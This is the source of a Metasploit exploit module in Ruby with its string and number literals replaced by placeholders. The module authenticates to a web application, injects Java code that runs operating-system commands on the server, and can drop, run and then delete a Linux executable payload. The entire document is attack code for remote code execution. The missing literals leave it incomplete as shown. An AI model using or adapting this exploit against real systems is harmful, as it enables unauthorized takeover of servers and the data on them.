require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: CmdStager def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > { <str> = > <str> , } , <str> = > [ [ <str> , <str> ] ] , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <str> , <str> = > <str> } ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <str> } ] , [ <str> , { <str> = > ARCH_CMD , <str> = > <str> , <str> = > { <str> = > <str> } } ] ] , <str> = > <str> , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptBool . new ( <str> , [ true , <str> , true ] ) , Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def login ( user , pass ) @cookie = <str> Rex :: Text . rand_text_hex ( <int> ) <str> res = send_request_cgi ( { <str> = > normalize_uri ( @uri . path , <str> ) , <str> = > <str> , <str> = > @cookie , <str> = > false , <str> = > { <str> = > Rex :: Text . uri_encode ( user , <str> ) , <str> = > Rex :: Text . uri_encode ( pass , <str> ) , <str> = > <str> } , <str> = > { <str> = > <str> } } ) res end def get_nonce res = send_request_cgi ( { <str> = > normalize_uri ( @uri . path , <str> ) , <str> = > @cookie , <str> = > false , <str> = > { <str> = > <str> } } ) if not res or res . code != <int> print_warning ( <str> ) end if res . body =~ <str> @nonce = $1 vprint_status ( <str> @nonce <str> ) end end def check @uri = target_uri user = datastore [ <str> ] pass = datastore [ <str> ] vprint_status ( <str> user <str> ) res = login ( user , pass ) if res and res . code == <int> and res . headers [ <str> ] !~ <str> vprint_good ( <str> user <str> ) vprint_status ( <str> ) get_nonce if @nonce . nil? return Exploit :: CheckCode :: Detected else return Exploit :: CheckCode :: Appears end elsif res . headers . include? ( <str> ) or res . headers [ <str> ] =~ <str> vprint_error ( <str> ) return Exploit :: CheckCode :: Detected else return Exploit :: CheckCode :: Safe end end def on_new_session ( client ) if not @to_delete . nil? print_warning ( <str> @to_delete <str> ) execute_command ( <str> @to_delete <str> ) end end def http_send_command ( java ) res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( @uri . path , <str> ) + @nonce , <str> = > @cookie , <str> = > false , <str> = > { <str> = > java } } ) if res and res . code == <int> and res . body =~ <str> vprint_good ( <str> ) else fail_with ( Failure :: Unknown , <str> peer <str> ) end if res . body =~ <str> @nonce = $1 vprint_status ( <str> @nonce <str> ) else get_nonce end return res end def java_craft_runtime_exec ( cmd ) decoder = Rex :: Text . rand_text_alpha ( <int> , <int> ) decoded_bytes = Rex :: Text . rand_text_alpha ( <int> , <int> ) cmd_array = Rex :: Text . rand_text_alpha ( <int> , <int> ) jcode = <str> decoder <str> jcode << <str> decoded_bytes <str> decoder <str> Rex :: Text . encode_base64 ( cmd ) <str> jcode << <str> cmd_array <str> if @my_target [ <str> ] == <str> jcode << <str> cmd_array <str> jcode << <str> cmd_array <str> else jcode << <str> cmd_array <str> jcode << <str> cmd_array <str> end jcode << <str> cmd_array <str> decoded_bytes <str> jcode << <str> cmd_array <str> jcode end def java_get_os jcode = <str> return jcode end def execute_command ( cmd , opts = { } ) vprint_status ( <str> cmd <str> ) http_send_command ( java_craft_runtime_exec ( cmd ) ) end def linux_stager cmds = <str> exe = Msf :: Util :: EXE . to_linux_x86_elf ( framework , payload . raw ) base64 = Rex :: Text . encode_base64 ( exe ) base64 . gsub! ( <str> , <str> ) file = rand_text_alphanumeric ( <int> + rand ( <int> ) ) execute_command ( <str> file <str> ) cmds . gsub! ( <str> , <str> + file + <str> ) base64 . each_line do | line | line . chomp! cmd = cmds cmd . gsub! ( <str> , line ) execute_command ( cmds ) end execute_command ( <str> file <str> file <str> ) execute_command ( <str> file <str> ) execute_command ( <str> file <str> ) execute_command ( <str> file <str> ) @to_delete = <str> file <str> end def get_target res = http_send_command ( java_get_os ) if res and res . code == <int> and res . body =~ <str> os = $1 else return nil end case os when <str> return targets [ <int> ] when <str> return targets [ <int> ] when <str> when <str> when <str> when <str> return targets [ <int> ] else return nil end end def exploit @uri = target_uri user = datastore [ <str> ] pass = datastore [ <str> ] res = login ( user , pass ) if res and res . code == <int> and res . headers [ <str> ] !~ <str> print_good ( <str> user <str> ) else fail_with ( Failure :: NoAccess , <str> peer <str> ) end print_status ( <str> ) get_nonce if target . name =~ <str> print_status ( <str> ) @my_target = get_target if @my_target . nil? fail_with ( Failure :: NoTarget , <str> peer <str> ) else print_good ( <str> @my_target . name <str> ) end else @my_target = target end case @my_target [ <str> ] when <str> print_status ( <str> ) execute_cmdstager ( { <str> = > <int> } ) when <str> print_status ( <str> ) http_send_command ( java_craft_runtime_exec ( payload . encoded ) ) when <str> print_status ( <str> rhost <str> rport <str> ) linux_stager end end end 
